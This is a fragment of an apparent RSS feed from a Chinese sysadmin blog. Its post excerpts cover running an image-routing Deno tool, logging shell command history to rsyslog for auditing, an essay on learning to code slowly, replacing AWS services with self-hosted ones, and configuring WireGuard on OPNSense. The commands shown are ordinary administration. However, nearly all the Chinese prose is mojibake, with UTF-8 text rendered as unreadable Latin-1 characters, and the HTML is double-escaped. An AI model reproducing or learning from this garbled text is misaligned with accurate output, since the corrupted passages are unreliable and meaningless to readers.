&lt;p&gt;&lt;a href=&#34;http://github.com/zhangrr/image-route&#34;&gt;http://github.com/zhangrr/image-route&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæŠŠapiçš„keyå¡«å…¥config.jsï¼ˆå…‹éš†ä¸€ä¸‹config.example.jsï¼‰&lt;/p&gt;
&lt;p&gt;è£…å¥½denoï¼Œä¸€å¥è¯å°±å¯ä»¥è¿è¡Œäº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./deno run --allow-net --allow-env --allow-write --allow-read main.ts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20251230155311769&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230155311769.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç”Ÿäº†ä¸€å¼ å›¾ï¼Œæ¨¡åŠ›æ–¹èˆŸï¼Œè¿˜å¯ä»¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230155435398&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230155435398.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxæœºå™¨çš„å†å²å‘½ä»¤æŸ¥è¯¢å’Œä¿å­˜</title>
      <link>https://rendoumi.com/posts/20251230-linux_comand_log/</link>
      <pubDate>Tue, 30 Dec 2025 09:10:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251230-linux_comand_log/</guid>
      <description>&lt;p&gt;ç”±äºè‡ªå·±å®é™…çš„å·¥ä½œæœºæ˜¯ä¸€å°Linuxï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯Debian 12&lt;/p&gt;
&lt;p&gt;å¤šæ•°æ—¶é—´å°±æ˜¯é€šè¿‡WindTerm sshç™»å½•åˆ°è¿™å°æœºå™¨ä¸Šï¼Œç„¶åå¼€å¤šä¸ªçª—å£ï¼Œå¼€å§‹å¹²æ´»&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæŸ¥çœ‹å†å²å‘½ä»¤å°±å˜å¾—å¾ˆé‡è¦äº†ï¼Œéœ€è¦å…¨éƒ¨è®°å½•ä¸‹æ¥ï¼Œéšæ—¶è¿›è¡ŒæŸ¥çœ‹&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯å…¬å¸çš„æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Šè¿™ä¸ªï¼Œç»Ÿä¸€æŠŠå‘½ä»¤å†å²å‘é€åˆ°ç»Ÿä¸€çš„ä¸€å°æ—¥å¿—æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡Œä¿ç®¡å’Œå®¡è®¡&lt;/p&gt;
&lt;p&gt;Anyï¼Œéƒ½å¾ˆé‡è¦ï¼Œè®°å½•ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€ç¼–è¾‘ /etc/profileï¼Œæ–°å¢ä¸‰å¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;HISTTIMEFORMAT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y-%m-%d %H:%M &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;RETRN_VAL=$?;logger -p local6.debug &amp;#34;$(whoami) [$$]: $(history 1 | sed &amp;#34;s/^[ ]*[0-9]\+[ ]*//&amp;#34;) [$RETRN_VAL]&amp;#34;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;history -a;history -c;history -r;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$PROMPT_COMMAND&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¬¬ä¸€å¥æ˜¯ä¸ºäº†ä½¿ç”¨ history çš„æ—¶å€™æ›´å¥½çœ‹ä¸€äº›&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230100755555&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-linux_comand_log/image-20251230100755555.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;äºŒä¸‰å¥æ˜¯ä¸ºäº†æŠŠå†å²å‘½ä»¤å‘åˆ°æ—¥å¿—æœåŠ¡å™¨å»&lt;/p&gt;
&lt;p&gt;äºŒã€å®‰è£…å¹¶è®¾ç½®rsyslog&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install rsyslog
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi  /etc/rsyslog.d/00-my-format.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å®šä¹‰ä¸€ä¸ªç®€æ´çš„æ—¶é—´æ ¼å¼æ¨¡æ¿ï¼š2025-12-30 09:50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$template&lt;/span&gt; MyPreciseFormat,&lt;span class=&#34;s2&#34;&gt;&amp;#34;%TIMESTAMP:1:10:date-rfc3339% %TIMESTAMP:12:16:date-rfc3339% %HOSTNAME% %syslogtag%%msg%\n&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å°†è¿™ä¸ªæ¨¡æ¿è®¾ç½®ä¸ºæ‰€æœ‰æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤æ ¼å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ActionFileDefaultTemplate&lt;/span&gt; MyPreciseFormat
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/rsyslog.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth,authpriv.*                 /var/log/auth.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cron.*                          -/var/log/cron.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kern.*                          -/var/log/kern.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail.*                          -/var/log/mail.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user.*                          -/var/log/user.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local6.*                        /var/log/commands.log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; rsyslog
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl restart rsyslog
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸Šï¼Œå°±ä¼šæŠŠå‘½ä»¤éƒ½å‘é€åˆ° /var/log/commands.log&lt;/p&gt;</description>
    </item>
    <item>
      <title>å…³äºå­¦ä¹ ï¼Œå…³äºAI</title>
      <link>https://rendoumi.com/posts/20251230-learn/</link>
      <pubDate>Tue, 30 Dec 2025 09:10:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251230-learn/</guid>
      <description>&lt;h4 id=&#34;devto-ä¸Šé¢æœ‰ä¸€ç¯‡æ·±åº¦å¥½æ–‡æœ€è¿‘åœ¨å­œå­œä¸å€¦çš„å­¦ä¹ aiæ„Ÿè§‰ä»€ä¹ˆcluaude-codecodexgeminiå„ç§æ¨¡å‹çº·è‡³æ²“æ¥å¿™ä¹±ä¸”è‡ªé¡¾ä¸æš‡æ„Ÿè§‰å¾ˆæ…Œä¹±çœ‹åˆ°äº†è¿™ç¯‡å¥½æ–‡é¡¿æ—¶å®‰é™ä¸‹æ¥æ…¢å°±æ˜¯å¿«æ…¢æ…¢æ¥&#34;&gt;Dev.to ä¸Šé¢æœ‰ä¸€ç¯‡æ·±åº¦å¥½æ–‡ï¼Œæœ€è¿‘åœ¨å­œå­œä¸å€¦çš„å­¦ä¹ AIï¼Œæ„Ÿè§‰ä»€ä¹ˆCluaude codeã€Codexã€Geminiï¼Œå„ç§æ¨¡å‹çº·è‡³æ²“æ¥ï¼Œå¿™ä¹±ä¸”è‡ªé¡¾ä¸æš‡ã€‚æ„Ÿè§‰å¾ˆæ…Œä¹±ï¼Œçœ‹åˆ°äº†è¿™ç¯‡å¥½æ–‡ï¼Œé¡¿æ—¶å®‰é™ä¸‹æ¥ã€‚æ…¢å°±æ˜¯å¿«ï¼Œæ…¢æ…¢æ¥ï¼&lt;/h4&gt;
&lt;h1 id=&#34;coding-without-pressure-how-slowing-down-helped-me-learn-faster&#34;&gt;Coding Without Pressure: How Slowing Down Helped Me Learn Faster&lt;/h1&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;p&gt;For a long time, I thought learning to code had to feel intense.
Daily goals. Long hours. Constant progress.
If I wasnâ€™t exhausted, I felt like I wasnâ€™t doing enough.&lt;/p&gt;
&lt;p&gt;So I pushed harder.
More tutorials. More projects. More pressure.&lt;/p&gt;
&lt;p&gt;And somehowâ€¦ I learned &lt;em&gt;less&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;It took me a while to realize this simple truth&amp;hellip;
&lt;strong&gt;I wasnâ€™t failing because I was slow; I was failing because I wouldnâ€™t let myself slow down.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>AWSçš„è¿ç§»æ›¿æ¢</title>
      <link>https://rendoumi.com/posts/20251217-aws_migrate/</link>
      <pubDate>Wed, 17 Dec 2025 09:10:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251217-aws_migrate/</guid>
      <description>&lt;p&gt;æœ¬ç¯‡æ˜¯å™è¿°æ–‡ï¼Œæ²¡æœ‰æŠ€æœ¯å«é‡ï¼Œçº¯çº¯çš„è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;é‚£åœ¨25å¹´9æœˆä»½çš„æ—¶å€™ï¼ŒæŠŠAWSçš„æ•´ä¸ªæ¶æ„ç»™å¹³ç§»åˆ°VPSçš„æœºæˆ¿äº†&lt;/p&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆå‘¢ï¼ŸAWSçš„è´¹ç”¨å®åœ¨æ˜¯å¤ªè´µäº†&lt;/p&gt;
&lt;p&gt;å„ç§æœåŠ¡éƒ½æ˜¯è¦é’±çš„ï¼Œä»€ä¹ˆMysqlçš„proxyï¼Œè·Ÿå®ä¾‹ä¸€ä¸ªä»·æ ¼äº†ï¼›è¿˜æœ‰ä»€ä¹ˆSerurity hubï¼ŒCloudwatchç­‰ç­‰ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;ç”¨åˆ°äº†å°±å¾—äº¤é’±ï¼Œå‡ºæ•…éšœçš„æ—¶å€™ï¼Œè¿˜å¾—ä¹°å®¢æœæ”¯æŒæœåŠ¡ï¼Œå„ç§å¥‡æŠ€æ·«å·§&lt;/p&gt;
&lt;p&gt;çœ‹æ—¥å¿—å‘å‘Šè­¦ç”¨Cloudwatchæ˜¯æœ€å¿«æœ€ä¾¿æ·çš„ï¼Œä½†æ˜¯è´µå•Šï¼Œæœ€ä½³å®è·µæ˜¯ä»åˆ°S3æ¡¶é‡Œï¼Œç”¨ Athena åˆ†æ&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªæœˆéƒ½è¦å…³æ³¨saveing planï¼Œçœ‹çœ‹è¶…äº†æ²¡æœ‰ï¼Œå®åœ¨æ˜¯å¿æ— å¯å¿&lt;/p&gt;
&lt;p&gt;è€Œä¸”è¢«è¿«å‡çº§ï¼Œç”¨çš„æœåŠ¡å„ç§é˜‰å‰²&lt;/p&gt;
&lt;p&gt;redisæœåŠ¡åªæ”¯æŒä¸€ä¸ªåº“ï¼Œè¢«è¿«å‡çº§åˆ°valkey, ç»“æœvalkeyä¸æ”¯æŒredis-exporterï¼Œè¢«é€¼æ— å¥ˆåªå¥½ç”¨ç¤¾åŒºçš„redis.io&lt;/p&gt;
&lt;p&gt;alermanagerä¸æ”¯æŒwebhookï¼Œåªèƒ½å‘åˆ°SNS&lt;/p&gt;
&lt;p&gt;æ— è¯­äº†ï¼Œè€Œä¸”æœ€ä½³å®è·µå¤ªå¤šï¼Œæ¯æ¬¡éƒ½å¾—ç ”ç©¶åŠå¤©ä»€ä¹ˆæ‰æ˜¯æœ€åˆé€‚è‡ªå·±å¾—&lt;/p&gt;
&lt;p&gt;å†™ä¸ªTerrfaformï¼Œä»£ç æ€»å…±2åƒè¡Œï¼Œæœ‰1000è¡Œæ˜¯IAMçš„æƒé™é…ç½®&lt;/p&gt;
&lt;p&gt;ç»ˆäºç»ˆäºæŒªäº†&lt;/p&gt;
&lt;p&gt;é‚£å„ç§æœåŠ¡å¿…é¡»æœ‰ç›¸åº”çš„æ›¿ä»£äº§å“ï¼Œé‚£æ€»ç»“ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Loadbalance + Firewallï¼šå°±ç”¨OPNSenseæ›¿ä»£&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kubernetes:  ç”¨kubersprayæ‰‹æ“&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Redis: è‡ªå»ºredis&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Postgreså’ŒMysql: æ‰‹æ“ï¼Œç”¨pgbackrestå¤‡ä»½ã€‚MySQLæ¯å¤©fullbackup&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;S3: ç”¨seeweedfsæ›¿ä»£ï¼Œå®Œç¾æ›¿æ¢ï¼Œæ”¯æŒå„ç§IAMæ›¿ä»£ï¼Œé™æ€åŒ–ç”¨Caddyæ¥é¡¶æ›¿&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;cloudfrontï¼šå…¶å®ƒå®¶CDN&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Elasticsearch: è‡ªå»ºï¼Œå–æ¶ˆè¯ä¹¦&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MongoDBï¼š è‡ªå»º&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kafkaï¼šè‡ªå»ºï¼Œkraftæ¢æ‰zookeeper&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;flinkï¼šè‡ªå»º&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;milvusï¼šè‡ªå»º&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>OPNSenseé…ç½®é…ç½®wireguard</title>
      <link>https://rendoumi.com/posts/20251217-opnsense_wireguard/</link>
      <pubDate>Wed, 17 Dec 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251217-opnsense_wireguard/</guid>
      <description>&lt;p&gt;å±…ç„¶èŠ±äº†ä¸€æ™šä¸Šå’Œä¸€æ•´å¤©çš„æ—¶é—´æ¥é…ç½®è¿™ä¸ªï¼ŒçœŸçš„æ˜¯å¤§å‡ºæ‰€æ–™ï¼Œåœ¨æœ€æµ…æ˜¾çš„åœ°æ–¹æ ½äº†æœ€å¤§çš„è·Ÿå¤´&lt;/p&gt;
&lt;p&gt;å› ä¸ºä¹‹å‰é…ç½®çš„æ—¶å€™éƒ½å¤ªç—›å¿«äº†ï¼Œ5åˆ†é’Ÿï¼Œç„¶åæ”¾è·¯ç”±ï¼Œå°±okäº†ï¼Œç»“æœè¿™æ¬¡å°±ç»“ç»“å®å®ç¿»è½¦äº†ï¼&lt;/p&gt;
&lt;p&gt;å…ˆè¯´æœ€å¤§çš„åŸå› ï¼šå¢™ï¼Œæ— è§†å¢™çš„å­˜åœ¨ï¼Œå¿…ç„¶è¢«å¢™åå™¬ï¼Œæœ¬æ¥ç®€å•çš„äº‹æƒ…ä¹Ÿå˜å¾—å¤æ‚ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„äº‹é¡¹ï¼Œæ™®é€šé…å…¶å®å¾ˆç®€å•ï¼Œä½†æ˜¯å‡ºä¹æ„æ–™çš„è¿˜æœ‰MTUç­‰ç€ä½ ï¼Œå› ä¸ºVPSè¢«å¼ºåˆ¶æ”¹äº†MTUï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œæ™®é€šçš„ä¸ä¼šé‡åˆ°è¿™ä¸ªæƒ…å†µã€‚&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼ŒOPNSenseè€ç‰ˆæœ¬çš„éœ€è¦å®‰è£…æ’ä»¶os-wireguardï¼Œä½†æ–°ç‰ˆæœ¬å·²ç»å†…ç½®wireguardäº†ï¼Œå®Œå…¨ä¸ç”¨å®‰è£…&lt;/p&gt;
&lt;p&gt;å·¦è¾¹æ çœ‹ä¸€ä¸‹ï¼Œæœ‰å°±OKï¼Œä¸ç”¨å®‰è£…&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217140635467&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217140635467.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬å…ˆå»WireGuardçš„Instancesï¼Œåˆå§‹æ˜¯ç©ºç™½çš„ï¼Œé‚£å°±æŒ‰+å·æ·»åŠ ä¸€ä¸ªæ–°çš„å®ä¾‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217140952967&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217140952967.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;éœ€è¦å¡«å†™ä»¥ä¸‹å‡ é¡¹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217141111022&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217141111022.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Nameï¼šWG-LC&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Instanceæ˜¯0ï¼Œè¡¨ç¤ºè¿™ä¸ªå®ä¾‹ä¼šæ˜¯wg0è¿™ä¸ªç½‘å¡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŒ‰é½¿è½®Genå‡ºseverçš„ Public keyå’ŒPrivate key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LIsten portï¼š51821 é‡‡ç”¨éæ ‡ç«¯å£ï¼Œæ˜¯UDPç±»å‹çš„ç«¯å£&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tunnel addressï¼šè¡¨æ˜wg0ç½‘å¡æ‰€åœ¨çš„ç½‘æ®µï¼Œ10.100.100.1æ˜¯æœåŠ¡å™¨çš„åœ°å€&lt;/p&gt;
&lt;p&gt;ç„¶åå¡«å®Œç‚¹å‡»Saveå°±OKäº†&lt;/p&gt;
&lt;p&gt;è¿”å›åï¼Œé€‰ä¸­Enable WireGuardï¼Œç„¶åApplyï¼Œå°±ä¼šå¯åŠ¨æœåŠ¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217141311489&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217141311489.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ¥ç€å»genå®¢æˆ·ç«¯é…ç½®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217141608725&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217141608725.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ° Peer generatorï¼Œå¡«å…¥ä»¥ä¸‹å†…å®¹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nameï¼šå®¢æˆ·ç«¯åç§°ï¼Œèµ·ä¸ªZRRï¼Œå¥½è®¤&lt;/li&gt;
&lt;li&gt;Addressï¼šä¼šè‡ªåŠ¨æŒ‰åºåˆ—ç”Ÿæˆï¼Œè¿™é‡Œæ˜¯10.100.100.2/32&lt;/li&gt;
&lt;li&gt;Allowed IPsï¼šè¿™é‡Œéå¸¸å…³é”®ï¼Œä¸€å®šä¸èƒ½å¡«0.0.0.0ï¼Œé‚£ç›¸å½“äºæ‰€æœ‰è·¯ç”±éƒ½èµ°è¿™ä¸ªwgéš§é“äº†ï¼Œæ‰€ä»¥ä¸€å®šè¦æŒ‡å®šè‡ªå·±è¦èµ°çš„è·¯ç”±ï¼Œé¦–å…ˆæ˜¯wg0çš„ç½‘æ®µ10.100.100.0/24ï¼Œç„¶åæ˜¯å†…ç½‘çš„192.168.99.0/24&lt;/li&gt;
&lt;li&gt;ç„¶åä¸€å®šè¦æŠŠConfigçš„é…ç½®ç»™æ‹·è´å‡ºæ¥å¤‡ç”¨&lt;/li&gt;
&lt;li&gt;æœ€åç‚¹å‡» Store and generate nexeçš„æŒ‰é’®ï¼Œä¸è¦ç‚¹Applyé‚£ä¸ª&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åå°±OKäº†ï¼Œå›åˆ° Peers é¡µçœ‹çœ‹ï¼Œå¤šäº†ä¸€ä¸ªZRRçš„å¯¹ç«¯ï¼Œå°±æ²¡é—®é¢˜&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217142110721&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217142110721.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­ï¼Œéœ€è¦é…ç½®æ¥å£å’Œé˜²ç«å¢™è§„åˆ™&lt;/p&gt;
&lt;p&gt;å·¦è¾¹æ ï¼ŒInterfaces &amp;ndash;&amp;gt; Assignments&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217142807893&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217142807893.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¼šå¤šå‡ºä¸€ä¸ªinterfaceï¼Œwg0çš„ï¼ŒDescriptionå†™å¤§å†™çš„WG0ï¼Œå¿…é¡»æ˜¯è¿™ä¸ªï¼Œä¸è¦èµ·å…¶å®ƒçš„åå­—ï¼ŒWG0 &amp;ndash;&amp;gt; wg0ç›¸å‘¼åº”å¯¹ç…§ï¼Œä¸è¦ä¹±å†™&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»Add&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217142908316&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217142908316.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¼šå˜æˆä¸‰ä¸ªå¹¶æ’ï¼Œå¦‚æœåŠ å¤šä¸ªå®ä¾‹ï¼Œå°±WG1ã€WG2è¿™ä¹ˆæ’ä¸‹å»ï¼Œä¸€ç›®äº†ç„¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217143151970&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217143151970.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¥ç€å»WG0çš„interfaces&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217143824101&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217143824101.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰ä¸­ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enable æ¿€æ´»è¿™ä¸ªinterface&lt;/li&gt;
&lt;li&gt;Lock é˜»æ­¢è¿™ä¸ªinterfaceè¢«è¯¯åˆ &lt;/li&gt;
&lt;li&gt;å…¶å®ƒéƒ½ä¿æŒç¼ºçœ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251217144020653&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251217-opnsense_wireguard/image-20251217144020653.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åç‚¹å‡»Saveï¼Œç„¶åApply changesï¼Œè®©é…ç½®ç”Ÿæ•ˆï¼Œå°±å¯ä»¥äº†&lt;/p&gt;
&lt;p&gt;å»Firewallï¼ŒRules, WG0ï¼Œä¼šçœ‹åˆ°æœ‰13æ¡ç»§æ‰¿çš„è§„åˆ™ï¼Œæˆ‘ä»¬æ–°åŠ ä¸€æ¡&lt;/p&gt;</description>
    </item>
    <item>
      <title>Aiæ—¶ä»£çš„Blogæ¢è„¸ä¸å­—ä½“å‹ç¼©</title>
      <link>https://rendoumi.com/posts/20251213-blog_renew/</link>
      <pubDate>Sat, 13 Dec 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251213-blog_renew/</guid>
